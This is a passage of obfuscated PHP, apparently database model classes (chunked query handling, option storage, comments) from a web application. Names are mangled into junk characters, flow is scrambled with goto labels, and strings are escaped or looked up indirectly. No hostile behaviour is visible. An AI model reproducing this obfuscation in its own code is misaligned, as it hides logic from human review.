($fÊÀİ¯áÔƒ == $C¢£‘À¹£ğ || $FÍØ«İ®éŞ == $Aì­‡²©ö - 1) { goto E×¹²æ¼¾‘; EÕ†¦Âà’: $fÊÀİ¯áÔƒ = 0; $C½Œ‚î‚Ñ¸ = $aˆÎÈËÚö¡; $this->chunkEventCheck(count($aÃÔÄÉ’ËÕ)); goto BÀŒÖŞ‚; BÀŒÖŞ‚: $aÃÔÄÉ’ËÕ = array(); goto eŠÈâòÖ›; E×¹²æ¼¾‘: $FÛŠß‰ = implode($C×¶¬¨‡óâ[47], $aÃÔÄÉ’ËÕ); $C½Œ‚î‚Ñ¸ .= "\x20\x45\116\x44\40\40\127\x48\x45\122\105\40{$A÷ÔÈÏ„íö[0]}\x20\111\116\40\x28{$FÛŠß‰}\x29\40"; $this->execute($C½Œ‚î‚Ñ¸); goto EÕ†¦Âà’; eŠÈâòÖ›: } } goto FßçĞÅ·ç¥; a”µŠ‹’Á£: } public function saveAllEach($BĞ’¯ØŠ¶é) { $b¼ƒ«´¥Ê² =& $_SERVER[Ç³Íß¦Ó]; $CÊ²êÉÛš = $this->tablePrefix . $this->tableName; foreach ($BĞ’¯ØŠ¶é as $CøŞÊºªÒ) { if (!is_array($CøŞÊºªÒ) || count($CøŞÊºªÒ) != 4) { continue; } $eæ¿Šç’Ï­ = $CøŞÊºªÒ[0] . $b¼ƒ«´¥Ê²[375] . $CøŞÊºªÒ[1] . $b¼ƒ«´¥Ê²[116]; $dĞàã±íÎ´ = $CøŞÊºªÒ[2] . $b¼ƒ«´¥Ê²[375] . $CøŞÊºªÒ[3] . $b¼ƒ«´¥Ê²[116]; $Bññ‡šÙå = "\165\160\144\x61\x74\145\40{$CÊ²êÉÛš}\40\163\x65\164\x20{$dĞàã±íÎ´}\x20\167\150\x65\162\x65\x20{$eæ¿Šç’Ï­}\x3b"; $this->execute($Bññ‡šÙå); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($E•†‹ÅÍá = false, $AÊ‹ÈïÕÃò = false) { $this->_chunkEvent = $E•†‹ÅÍá; $this->_chunkEventParam = $AÊ‹ÈïÕÃò; } private function chunkEventCheck($FÉÉ²¦¡æ—) { if (!$this->_chunkEvent) { return; } $C¡ò¬ºŞöœ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $C¡ò¬ºŞöœ[$_SERVER[Ç³Íß¦Ó][376]] = $FÉÉ²¦¡æ—; Hook::trigger($this->_chunkEvent, $C¡ò¬ºŞöœ); } public function addAll($b»ïùŸ­åå, $Aè²Ã„åØ = array(), $a¶©Ë´½ = false) { goto aÑÕåÇÁ²”; DÉÆğ¶ÌŠ¢: if (empty($b»ïùŸ­åå)) { $this->error = think_lang($bœ‡ŒÃ˜Ï[268]); return !1; } $Aè²Ã„åØ = $this->_parseOptions($Aè²Ã„åØ); foreach ($b»ïùŸ­åå as $A•¦¿Ş¸İ => $bÕà¾ºÔí) { $b»ïùŸ­åå[$A•¦¿Ş¸İ] = $this->_facade($bÕà¾ºÔí); $this->_beforeInsert($b»ïùŸ­åå[$A•¦¿Ş¸İ], $Aè²Ã„åØ); } goto FĞ´†õ©ï; aÑÕåÇÁ²”: $bœ‡ŒÃ˜Ï =& $_SERVER[Ç³Íß¦Ó]; ignore_timeout(); $e³‹Ã£ÒÌ› = self::SQL_WHERE_IN_CHUNK; goto DÉÆğ¶ÌŠ¢; FĞ´†õ©ï: if (method_exists($this->db, $bœ‡ŒÃ˜Ï[269])) { for ($aáŒ „¶£Ü = 0; $aáŒ „¶£Ü < count($b»ïùŸ­åå); $aáŒ „¶£Ü += $e³‹Ã£ÒÌ›) { $bé «¾‘ø = array_slice($b»ïùŸ­åå, $aáŒ „¶£Ü, $e³‹Ã£ÒÌ›); if (!is_array($bé «¾‘ø) || count($bé «¾‘ø) == 0) { break; } $b‘ˆ°õ…Ç‘ = $this->db->insertAll($bé «¾‘ø, $Aè²Ã„åØ, $a¶©Ë´½); $this->chunkEventCheck(count($bé «¾‘ø)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($b»ïùŸ­åå as $A•¦¿Ş¸İ => $bÕà¾ºÔí) { $b‘ˆ°õ…Ç‘ = $this->db->insert($bÕà¾ºÔí, $Aè²Ã„åØ, $a¶©Ë´½); } $this->commit(); } if (!1 !== $b‘ˆ°õ…Ç‘) { $FˆŞñ¤íÃ = $this->getLastInsID(); if ($FˆŞñ¤íÃ) { return $FˆŞñ¤íÃ; } } return $b‘ˆ°õ…Ç‘; goto AËÄ¤¦…±º; AËÄ¤¦…±º: } public function save($d‚‚•õØéì = '', $Bœ•¶Ä¿¾ = array()) { goto d–È‚˜‰ê¿; d–È‚˜‰ê¿: $Dêë¯Â£é =& $_SERVER[Ç³Íß¦Ó]; $E½Ù“ëùø– = self::SQL_WHERE_IN_CHUNK; $a¾Ïö˜—¤ = $this->optionsValue(); goto cÌõ¹„¹ä; B†ì”¡®: $fÀ²ãÌæ¯Î = $a¾Ïö˜—¤[$Dêë¯Â£é[272]][$aŒô¾‘»¥ç][1]; $fÀ²ãÌæ¯Î = is_array($fÀ²ãÌæ¯Î) ? $fÀ²ãÌæ¯Î : array(); $EªçÇ‚ñÁÅ = count($fÀ²ãÌæ¯Î); goto Eóæ¸…ß; Eóæ¸…ß: for ($c„õ‹ƒ¹‰‘ = 0; $c„õ‹ƒ¹‰‘ < $EªçÇ‚ñÁÅ; $c„õ‹ƒ¹‰‘ += $E½Ù“ëùø–) { $fØ«»æƒ°ç = array_slice($fÀ²ãÌæ¯Î, $c„õ‹ƒ¹‰‘, $E½Ù“ëùø–); if (!is_array($fØ«»æƒ°ç) || count($fØ«»æƒ°ç) == 0) { break; } $a¾Ïö˜—¤[$Dêë¯Â£é[272]][$aŒô¾‘»¥ç][1] = $fØ«»æƒ°ç; $this->optionsValue($a¾Ïö˜—¤); $cù¯ƒ±Ïæ += parent::save($d‚‚•õØéì, $Bœ•¶Ä¿¾); $this->chunkEventCheck(count($fØ«»æƒ°ç)); } $this->chunkEventSet(); return $cù¯ƒ±Ïæ; goto C©ºëî¥í; cÌõ¹„¹ä: $aŒô¾‘»¥ç = $this->findWhereField($a¾Ïö˜—¤); if (!$aŒô¾‘»¥ç) { return parent::save($d‚‚•õØéì, $Bœ•¶Ä¿¾); } $cù¯ƒ±Ïæ = 0; goto B†ì”¡®; C©ºëî¥í: } public function add($a÷»ÁàÛ‚ï = '', $BÂšà‘†ˆ = array(), $F‡í˜¶³ãç = false) { if ($this->addTaskStatus && is_array($a÷»ÁàÛ‚ï)) { $this->addTaskData[] = $a÷»ÁàÛ‚ï; return; } return parent::add($a÷»ÁàÛ‚ï, $BÂšà‘†ˆ, $F‡í˜¶³ãç); } public function parseWhereLike($bŒéŒ¬÷¸, $eø²¶Æî™ = '', $fÄ¾ì±ˆä = false, &$Aî† †„­† = false) { goto eî¸¦ñÑ»Ï; eî¸¦ñÑ»Ï: $f–¤ô Ûİ£ =& $_SERVER[Ç³Íß¦Ó]; $aœõ‚„Õß‚ = $GLOBALS[$f–¤ô Ûİ£[6]][$f–¤ô Ûİ£[377]]; if (!$aœõ‚„Õß‚[$f–¤ô Ûİ£[378]]) { return $bŒéŒ¬÷¸; } goto dƒ’œêË‡º; C…Œãöñ: foreach ($bŒéŒ¬÷¸ as $b†®ßŞ–ë¤ => $aÌ‡ÏÌÁÔ²) { if (is_array($aÌ‡ÏÌÁÔ²) && count($aÌ‡ÏÌÁÔ²) == 2 && $aÌ‡ÏÌÁÔ²[0] == $f–¤ô Ûİ£[379] && is_string($aÌ‡ÏÌÁÔ²[1]) && substr($aÌ‡ÏÌÁÔ²[1], 0, 1) == $f–¤ô Ûİ£[380] && substr($aÌ‡ÏÌÁÔ²[1], strlen($aÌ‡ÏÌÁÔ²[1]) - 1, 1) == $f–¤ô Ûİ£[380]) { goto BâïÅ—·Ş; BâïÅ—·Ş: $Aî† †„­† = !0; $a¨ñéİè×š = is_string($b†®ßŞ–ë¤) ? $b†®ßŞ–ë¤ : $eø²¶Æî™; $B“ÎİŞßÆ = substr($aÌ‡ÏÌÁÔ²[1], 1, strlen($aÌ‡ÏÌÁÔ²[1]) - 2); goto b£ã¬²™®æ; a¹™ùš™¿“: continue; goto CÛ´À³Äˆ; b£ã¬²™®æ: $B“ÎİŞßÆ = $this->db->escapeString($B“ÎİŞßÆ); if (!strpos($a¨ñéİè×š, $f–¤ô Ûİ£[95])) { $a¨ñéİè×š = $f–¤ô Ûİ£[381] . $a¨ñéİè×š . $f–¤ô Ûİ£[381]; } $Cê½õ™Ğ– = $f–¤ô Ûİ£[182] . $B“ÎİŞßÆ . $f–¤ô Ûİ£[182]; goto C“Ù«´˜ñˆ; C“Ù«´˜ñˆ: if ($aœõ‚„Õß‚[$f–¤ô Ûİ£[382]]) { $Cê½õ™Ğ– = $f–¤ô Ûİ£[383] . $B“ÎİŞßÆ . $f–¤ô Ûİ£[384]; if ($aœõ‚„Õß‚[$f–¤ô Ûİ£[385]]) { $Cê½õ™Ğ– = $f–¤ô Ûİ£[384] . $B“ÎİŞßÆ . $f–¤ô Ûİ£[383]; } } $DåòĞª¾ˆØ[$c¤“í†®—İ] = $f–¤ô Ûİ£[386] . $a¨ñéİè×š . $f–¤ô Ûİ£[387] . $Cê½õ™Ğ– . $f–¤ô Ûİ£[388]; $c¤“í†®—İ++; goto a¹™ùš™¿“; CÛ´À³Äˆ: } if (is_array($aÌ‡ÏÌÁÔ²)) { $eø²¶Æî™ = is_string($b†®ßŞ–ë¤) ? $b†®ßŞ–ë¤ : $eø²¶Æî™; $aÌ‡ÏÌÁÔ² = $this->parseWhereLike($aÌ‡ÏÌÁÔ², $eø²¶Æî™, !0, $Aî† †„­†); } if (is_numeric($b†®ßŞ–ë¤)) { $DåòĞª¾ˆØ[$c¤“í†®—İ] = $aÌ‡ÏÌÁÔ²; $c¤“í†®—İ++; } else { $DåòĞª¾ˆØ[$b†®ßŞ–ë¤] = $aÌ‡ÏÌÁÔ²; } } if ($Aî† †„­† && !$fÄ¾ì±ˆä) { } return $DåòĞª¾ˆØ; goto B¯ËÑ¶Í²; dƒ’œêË‡º: if (!is_array($bŒéŒ¬÷¸)) { return $bŒéŒ¬÷¸; } $DåòĞª¾ˆØ = array(); $c¤“í†®—İ = 0; goto C…Œãöñ; B¯ËÑ¶Í²: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eæßÔ†Îš = array()) { goto Cƒˆ‘èÀË; Cƒˆ‘èÀË: $FŸ´ÖÑ¥é =& $_SERVER[Ç³Íß¦Ó]; $cóìŸâÌ§ = self::SQL_WHERE_IN_CHUNK; $aòó…ÑŠ°º = $this->optionsValue(); goto BÒ“ŠÆŸÈ; BÒ“ŠÆŸÈ: $bøÌ—áÂóÏ = $this->findWhereField($aòó…ÑŠ°º); if (!$bøÌ—áÂóÏ || isset($aòó…ÑŠ°º[$FŸ´ÖÑ¥é[289]]) || isset($aòó…ÑŠ°º[$FŸ´ÖÑ¥é[350]])) { return parent::select($eæßÔ†Îš); } $CÍ™ÎğËˆ£ = $aòó…ÑŠ°º[$FŸ´ÖÑ¥é[272]][$bøÌ—áÂóÏ][1]; goto Fì”‡”¦Ç; Fì”‡”¦Ç: $CÍ™ÎğËˆ£ = is_array($CÍ™ÎğËˆ£) ? $CÍ™ÎğËˆ£ : array(); $f§Š³”Òöã = null; for ($F­¯ˆİŞª‡ = 0; $F­¯ˆİŞª‡ < count($CÍ™ÎğËˆ£); $F­¯ˆİŞª‡ += $cóìŸâÌ§) { $F¢ÀƒØ÷²ê = array_slice($CÍ™ÎğËˆ£, $F­¯ˆİŞª‡, $cóìŸâÌ§); if (!is_array($F¢ÀƒØ÷²ê) || count($F¢ÀƒØ÷²ê) == 0) { break; } $aòó…ÑŠ°º[$FŸ´ÖÑ¥é[272]][$bøÌ—áÂóÏ][1] = $F¢ÀƒØ÷²ê; $this->optionsValue($aòó…ÑŠ°º); $Cî×„ßîĞ• = parent::select($eæßÔ†Îš); if (!$Cî×„ßîĞ•) { continue; } $f§Š³”Òöã = is_array($f§Š³”Òöã) ? $f§Š³”Òöã : array(); $f§Š³”Òöã = array_merge($f§Š³”Òöã, $Cî×„ßîĞ•); } goto b†è¶¡Â§; b†è¶¡Â§: return $f§Š³”Òöã; goto eà…ÈÒ…âò; eà…ÈÒ…âò: } public function delete($B¯ÍŠÔğ•­ = array()) { goto E¸¾ø°Ä‘“; Dª‘ìÒµñ“: return $dô¿ÉíŠæÒ; goto EŸ½‚¸Áç; cÈ‡÷Í‘±Ã: $aÜÏÑ‹˜Õí = $this->findWhereField($aƒ¹›•ÓÃ); if (!$aÜÏÑ‹˜Õí) { return parent::delete($B¯ÍŠÔğ•­); } $dô¿ÉíŠæÒ = 0; goto Fùá‹ßéÎÖ; E¸¾ø°Ä‘“: $A¼“Š»øÊá =& $_SERVER[Ç³Íß¦Ó]; $dîåÒŠµ©š = self::SQL_WHERE_IN_CHUNK; $aƒ¹›•ÓÃ = $this->optionsValue(); goto cÈ‡÷Í‘±Ã; Fùá‹ßéÎÖ: $AÒÏ‹ùŸ‰É = $aƒ¹›•ÓÃ[$A¼“Š»øÊá[272]][$aÜÏÑ‹˜Õí][1]; $AÒÏ‹ùŸ‰É = is_array($AÒÏ‹ùŸ‰É) ? $AÒÏ‹ùŸ‰É : array(); for ($d¢ì°Ù˜Ùò = 0; $d¢ì°Ù˜Ùò < count($AÒÏ‹ùŸ‰É); $d¢ì°Ù˜Ùò += $dîåÒŠµ©š) { $B¸Ö¾Ô´½¥ = array_slice($AÒÏ‹ùŸ‰É, $d¢ì°Ù˜Ùò, $dîåÒŠµ©š); if (!is_array($B¸Ö¾Ô´½¥) || count($B¸Ö¾Ô´½¥) == 0) { break; } $aƒ¹›•ÓÃ[$A¼“Š»øÊá[272]][$aÜÏÑ‹˜Õí][1] = $B¸Ö¾Ô´½¥; $this->optionsValue($aƒ¹›•ÓÃ); $dô¿ÉíŠæÒ += parent::delete($B¯ÍŠÔğ•­); } goto Dª‘ìÒµñ“; EŸ½‚¸Áç: } private function findWhereField($Dœ™´Ïìß“) { $DÜ•íÛË =& $_SERVER[Ç³Íß¦Ó]; $CìÜöãÑäÏ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Dœ™´Ïìß“) || !is_array($Dœ™´Ïìß“[$DÜ•íÛË[272]])) { return !1; } foreach ($Dœ™´Ïìß“[$DÜ•íÛË[272]] as $f¢õÛ£¬‰ë => $féÏİñÀç•) { if (is_array($féÏİñÀç•) && isset($féÏİñÀç•[0]) && is_string($féÏİñÀç•[0]) && strtolower($féÏİñÀç•[0]) == $DÜ•íÛË[7] && is_array($féÏİñÀç•[1]) && count($féÏİñÀç•[1]) > $CìÜöãÑäÏ) { ignore_timeout(); return $f¢õÛ£¬‰ë; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\155\x4f\160\164\x69\157\x6e"; public $field = array(); public function listData($b§ÆŠ¨Ë¸ = false, $B ²ƒÏÒ‰á = "\155\157\144\x69\146\171\124\x69\155\145", $AÈ²ƒéçî = false) { $b‹¾Ö·å•» = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b‹¾Ö·å•») { return $b§ÆŠ¨Ë¸ ? null : array(); } if (!$b§ÆŠ¨Ë¸) { $b‹¾Ö·å•» = array_filter(array_values($b‹¾Ö·å•»)); return array_sort_by($b‹¾Ö·å•», $B ²ƒÏÒ‰á, $AÈ²ƒéçî); } return $b‹¾Ö·å•»[$_SERVER[Ç³Íß¦Ó][389] . $b§ÆŠ¨Ë¸]; } public function insert($AàÈÏ¼ğĞ•) { goto AÛÁ½©ç; E£„÷›°áñ: $AàÈÏ¼ğĞ•[$E´ğÔÂŠ…ö[84]] = time(); Model($this->modelType)->set($E´ğÔÂŠ…ö[390], $B”¨“Ä›¬°, $this->optionType . $E´ğÔÂŠ…ö[391]); Model($this->modelType)->set($E´ğÔÂŠ…ö[389] . $B”¨“Ä›¬°, $AàÈÏ¼ğĞ•, $this->optionType); goto Dñ¯Ÿ–İó†; AÛÁ½©ç: $E´ğÔÂŠ…ö =& $_SERVER[Ç³Íß¦Ó]; $AàÈÏ¼ğĞ• = array_field_key($AàÈÏ¼ğĞ•, $this->field); $B”¨“Ä›¬° = Model($this->modelType)->get($E´ğÔÂŠ…ö[390], $this->optionType . $E´ğÔÂŠ…ö[391]); goto EÖ×™ÕêÑì; Dñ¯Ÿ–İó†: return $B”¨“Ä›¬°; goto Dš•÷ö¦ô‘; EÖ×™ÕêÑì: $B”¨“Ä›¬° = $B”¨“Ä›¬° ? $B”¨“Ä›¬° : 0; $AàÈÏ¼ğĞ•[$E´ğÔÂŠ…ö[392]] = ++$B”¨“Ä›¬°; $AàÈÏ¼ğĞ•[$E´ğÔÂŠ…ö[193]] = time(); goto E£„÷›°áñ; Dš•÷ö¦ô‘: } public function update($eÁÜà‘òŸ¬, $eì¹ß§—ŠŞ) { goto a¶¦…óÍ®Å; D§·Ù‹‰Š: return Model($this->modelType)->set($Eßöïß§Œ[389] . $eÁÜà‘òŸ¬, $eì¹ß§—ŠŞ, $this->optionType); goto c†ƒŸÊÅâå; fæÏÖ¯Ñï¤: if (!$CÖ‹ŠÄ¨) { return !1; } $eì¹ß§—ŠŞ = array_merge($CÖ‹ŠÄ¨, $eì¹ß§—ŠŞ); $eì¹ß§—ŠŞ[$Eßöïß§Œ[84]] = time(); goto D§·Ù‹‰Š; a¶¦…óÍ®Å: $Eßöïß§Œ =& $_SERVER[Ç³Íß¦Ó]; $eì¹ß§—ŠŞ = array_field_key($eì¹ß§—ŠŞ, $this->field); $CÖ‹ŠÄ¨ = $this->listData($eÁÜà‘òŸ¬); goto fæÏÖ¯Ñï¤; c†ƒŸÊÅâå: } public function remove($B¬ŒÈŠÑ) { return Model($this->modelType)->remove($_SERVER[Ç³Íß¦Ó][389] . $B¬ŒÈŠÑ, $this->optionType); } public function clear() { $fŠÃ²×ØÓ =& $_SERVER[Ç³Íß¦Ó]; Model($this->modelType)->remove($fŠÃ²×ØÓ[390], $this->optionType . $fŠÃ²×ØÓ[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($BøÈ´åÂª, $CöŞÏ­ØÂæ) { if (!$CöŞÏ­ØÂæ) { return !1; } $Eå·æ¤¦Ğ× = $this->listData(); $Eå·æ¤¦Ğ× = array_to_keyvalue($Eå·æ¤¦Ğ×, $BøÈ´åÂª); return isset($Eå·æ¤¦Ğ×[$CöŞÏ­ØÂæ]) ? $Eå·æ¤¦Ğ×[$CöŞÏ­ØÂæ] : !1; } public function findByName($c•†±ˆì†) { return $this->findByKey($_SERVER[Ç³Íß¦Ó][28], $c•†±ˆì†); } protected function resetData($eˆ“× ¡©‰) { $FİøÈÛÔÆ =& $_SERVER[Ç³Íß¦Ó]; $eˆ“× ¡©‰ = is_array($eˆ“× ¡©‰) ? $eˆ“× ¡©‰ : array(); $cÕãÎÄ°˜ = array(); for ($FÒ×ñ‰æŸß = 0; $FÒ×ñ‰æŸß < count($eˆ“× ¡©‰); $FÒ×ñ‰æŸß++) { $cÕãÎÄ°˜[$FİøÈÛÔÆ[389] . $eˆ“× ¡©‰[$FÒ×ñ‰æŸß][$FİøÈÛÔÆ[392]]] = $eˆ“× ¡©‰[$FÒ×ñ‰æŸß]; } return Model($this->modelType)->set($cÕãÎÄ°˜, !1, $this->optionType); } private function getAutoName($FĞ‚¹˜¾Ï®) { $F³àñ¿éÌ„ = array_to_keyvalue($this->listData(), $_SERVER[Ç³Íß¦Ó][28]); if (!$F³àñ¿éÌ„ || !isset($F³àñ¿éÌ„[$FĞ‚¹˜¾Ï®])) { return $FĞ‚¹˜¾Ï®; } for ($d‡Š›ôìÚÔ = 1; $d‡Š›ôìÚÔ < count($F³àñ¿éÌ„); $d‡Š›ôìÚÔ++) { $FŸ³××ŠŸ° = $FĞ‚¹˜¾Ï® . "\x28{$d‡Š›ôìÚÔ}\51"; if (!isset($F³àñ¿éÌ„[$FŸ³××ŠŸ°])) { return $FŸ³××ŠŸ°; } } return $FŸ³××ŠŸ°; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a¦’¼©¦à = false, $B„Ÿ¯Ã´Á¹ = '', $E ªŸÍ¦‘¬ = false) { goto c…¦Œ‹½¦; c…¦Œ‹½¦: $A«Ú¹´¯„ =& $_SERVER[Ç³Íß¦Ó]; $E¶éï‘‹ÁÌ = $this->cacheGet($B„Ÿ¯Ã´Á¹); $E–Àå‰¥¦· = $this->optionDefault($B„Ÿ¯Ã´Á¹); goto CÚ´„¨ò³; bÊØÎì‚—³: $this->cacheSet($B„Ÿ¯Ã´Á¹, $E¶éï‘‹ÁÌ); $E¶éï‘‹ÁÌ = array_merge($E–Àå‰¥¦·, $E¶éï‘‹ÁÌ); return $a¦’¼©¦à ? $E¶éï‘‹ÁÌ[$a¦’¼©¦à] : $E¶éï‘‹ÁÌ; goto A–½ŠÆÜã¿; CÚ´„¨ò³: $E–Àå‰¥¦· = is_array($E–Àå‰¥¦·) ? $E–Àå‰¥¦· : array(); if (is_array($E¶éï‘‹ÁÌ)) { $E¶éï‘‹ÁÌ = array_merge($E–Àå‰¥¦·, $E¶éï‘‹ÁÌ); return $a¦’¼©¦à ? isset($E¶éï‘‹ÁÌ[$a¦’¼©¦à]) ? $E¶éï‘‹ÁÌ[$a¦’¼©¦à] : null : $E¶éï‘‹ÁÌ; } $c†ê»é­¶ö = $this->filterWhere(array($A«Ú¹´¯„[29] => $B„Ÿ¯Ã´Á¹)); goto cŒ‰ï ½ºá; cŒ‰ï ½ºá: $E¶éï‘‹ÁÌ = $this->where($c†ê»é­¶ö)->select(); $E¶éï‘‹ÁÌ = array_to_keyvalue($E¶éï‘‹ÁÌ, $A«Ú¹´¯„[93], $A«Ú¹´¯„[371]); foreach ($E¶éï‘‹ÁÌ as $D»ƒñ•¹ô => $bâ‰šíìµ) { if ($E ªŸÍ¦‘¬ || in_array($D»ƒñ•¹ô, $this->jsonField)) { $E¶éï‘‹ÁÌ[$D»ƒñ•¹ô] = json_decode($bâ‰šíìµ, !0); } } goto bÊØÎì‚—³; A–½ŠÆÜã¿: } public function set($fÆŠ”…³®×, $F‹‹»‹©¶Ğ = false, $cÄ‹·‹« = '') { goto Bï§ñŞ°ç•; Bï§ñŞ°ç•: $E¸‡æŞ•ƒ‚ =& $_SERVER[Ç³Íß¦Ó]; $this->cacheRemove($cÄ‹·‹«); $a„»ÇÑ†ÏŠ = array(); goto aÌÔÔ¹îµŒ; CÄÄÀíâŠ: return $this->addAll($a„»ÇÑ†ÏŠ, array(), !0); goto FÍ…ÌÍ¶ª; aÌÔÔ¹îµŒ: $D¯öÙ³èŠ = is_array($fÆŠ”…³®×) ? $fÆŠ”…³®× : array($fÆŠ”…³®× => $F‹‹»‹©¶Ğ); foreach ($D¯öÙ³èŠ as $d§ÊÁãÑİ  => $Béºšóº¹) { if (is_array($Béºšóº¹)) { $Béºšóº¹ = json_encode_force($Béºšóº¹); } $this->checkLength($Béºšóº¹, !1, $this->tableName . $E¸‡æŞ•ƒ‚[4] . $fÆŠ”…³®×); $Béºšóº¹ = self::textEncode($Béºšóº¹); $D¯öÙ³èŠ = array($E¸‡æŞ•ƒ‚[29] => $cÄ‹·‹«, $E¸‡æŞ•ƒ‚[93] => $d§ÊÁãÑİ , $E¸‡æŞ•ƒ‚[371] => $Béºšóº¹); $a„»ÇÑ†ÏŠ[] = $this->filterWhere($D¯öÙ³èŠ); } if (!$a„»ÇÑ†ÏŠ) { return !0; } goto CÄÄÀíâŠ; FÍ…ÌÍ¶ª: } protected function optionDefault($C¾‹‘ìÈâ½ = '') { return !1; } public function setDeep($F¯‰§ƒ˜îÛ, $aÁâµ‘ Óğ = false, $aÔ¥—–›ë† = '') { $Fµñ°¥°ª® = explode($_SERVER[Ç³Íß¦Ó][95], $F¯‰§ƒ˜îÛ); $Eª†Ì¸ªø = $this->get(); array_set_value($Eª†Ì¸ªø, $F¯‰§ƒ˜îÛ, $aÁâµ‘ Óğ); $this->set($Fµñ°¥°ª®[0], $Eª†Ì¸ªø[$Fµñ°¥°ª®[0]], $aÔ¥—–›ë†); } public function remove($bÚ››Â«ğõ, $C›ßëÒØ¾ù = '') { $E¬„¢Ñ½ñ =& $_SERVER[Ç³Íß¦Ó]; $this->cacheRemove($C›ßëÒØ¾ù); $C¦âìà´ä± = $this->filterWhere(array($E¬„¢Ñ½ñ[93] => $bÚ››Â«ğõ, $E¬„¢Ñ½ñ[29] => $C›ßëÒØ¾ù)); if (is_null($bÚ››Â«ğõ)) { unset($C¦âìà´ä±[$E¬„¢Ñ½ñ[93]]); } return $this->where($C¦âìà´ä±)->delete(); } public function cacheSet($f”¸êãŞŞ, $e‰¿ÜÒáŸ = false) { return Cache::set($this->cacheKey($f”¸êãŞŞ), $e‰¿ÜÒáŸ); } public function cacheGet($e„šˆøæ) { return Cache::get($this->cacheKey($e„šˆøæ)); } public function cacheRemove($FÑ³™¢ˆœ ) { return Cache::remove($this->cacheKey($FÑ³™¢ˆœ )); } protected function filterWhere($eØé™ÖöŸí) { return $eØé™ÖöŸí; } protected function cacheKey($D¶ÚĞ£Ø‹ó) { return $D¶ÚĞ£Ø‹ó; } } goto DÜÕ««¶ä‰; C“§†åƒÚƒ: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\x65" => "\143\x6f\155\x6d\145\x6e\164\x5f\x6d\145\x74\141", "\155\x65\164\x61\x46\x69\x65\x6c\144" => "\143\157\155\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($D…ŒÖæç‡) { $EÒƒ¡Öâ× =& $_SERVER[Ç³Íß¦Ó]; if ($D…ŒÖæç‡[$EÒƒ¡Öâ×[1717]]) { $EÙ™µ¦Â‡‡ = $this->where(array($EÒƒ¡Öâ×[1718] => $D…ŒÖæç‡[$EÒƒ¡Öâ×[1717]]))->find(); if (!$EÙ™µ¦Â‡‡ || $EÙ™µ¦Â‡‡[$EÒƒ¡Öâ×[402]] != $D…ŒÖæç‡[$EÒƒ¡Öâ×[402]] || $EÙ™µ¦Â‡‡[$EÒƒ¡Öâ×[482]] != $D…ŒÖæç‡[$EÒƒ¡Öâ×[482]]) { return !1; } $this->where(array($EÒƒ¡Öâ×[1718] => $D…ŒÖæç‡[$EÒƒ¡Öâ×[1717]]))->setAdd($EÒƒ¡Öâ×[1719], 1); } $D…ŒÖæç‡[$EÒƒ¡Öâ×[1720]] = 0; $D…ŒÖæç‡[$EÒƒ¡Öâ×[1719]] = 0; $D…ŒÖæç‡[$EÒƒ¡Öâ×[714]] = 1; return $this->add($D…ŒÖæç‡); } public function commentCount($D¤·ñªÔ, $bóÕÊ›·ÓÃ) { goto dÃâ»Õ †™; cÍÇ…÷Ì¹‰: $AŸİ´ØšÜ‘ = array($cƒÈĞ©¡İà[482], $cƒÈĞ©¡İà[1721] => $cƒÈĞ©¡İà[478]); $d§²¹ñïÑ = array($cƒÈĞ©¡İà[482] => array($cƒÈĞ©¡İà[7], $D¤·ñªÔ), $cƒÈĞ©¡İà[402] => $bóÕÊ›·ÓÃ); $DŒ…Õ¨ƒç÷ = $this->field($AŸİ´ØšÜ‘)->where($d§²¹ñïÑ)->group($cƒÈĞ©¡İà[482])->select(); goto E¯©¸Õî‘å; dÃâ»Õ †™: $cƒÈĞ©¡İà =& $_SERVER[Ç³Íß¦Ó]; if (!$D¤·ñªÔ) { return array(); } if (is_string($D¤·ñªÔ) || is_int($D¤·ñªÔ)) { $D¤·ñªÔ = array($D¤·ñªÔ); } goto cÍÇ…÷Ì¹‰; E¯©¸Õî‘å: return array_to_keyvalue($DŒ…Õ¨ƒç÷, $cƒÈĞ©¡İà[482], $cƒÈĞ©¡İà[478]); goto AÚœ„Å¯®; AÚœ„Å¯®: } public function remove($bÙ®‹ùˆ–Š) { $D…‹Å¡ä¾Ò =& $_SERVER[Ç³Íß¦Ó]; $eğ‘ËÑ£¬‘ = array($D…‹Å¡ä¾Ò[1718] => $bÙ®‹ùˆ–Š); $e•‚ìÚòø = $this->where($eğ‘ËÑ£¬‘)->find(); if ($e•‚ìÚòø[$D…‹Å¡ä¾Ò[1717]]) { $this->where(array($D…‹Å¡ä¾Ò[1718] => $e•‚ìÚòø[$D…‹Å¡ä¾Ò[1717]]))->setAdd($D…‹Å¡ä¾Ò[1719], -1); } return $this->where($eğ‘ËÑ£¬‘)->delete(); } public function edit($D“î—‡î´, $EªŠ·Ÿí°Œ) { $fÂë‹µõ =& $_SERVER[Ç³Íß¦Ó]; $C†À­§ÆÌ = array($fÂë‹µõ[1718] => $D“î—‡î´); return $this->where($C†À­§ÆÌ)->save(array($fÂë‹µõ[1722] => $EªŠ·Ÿí°Œ)); } public function prasise($Föï™­ôæ¬) { $fÚË†±Ô¸å =& $_SERVER[Ç³Íß¦Ó]; $b…²˜ôÓÑ² = Model($fÚË†±Ô¸å[1723]); $B¬‡µÜŒµ¥ = array($fÚË†±Ô¸å[1718] => $Föï™­ôæ¬, $fÚË†±Ô¸å[1518] => USER_ID); 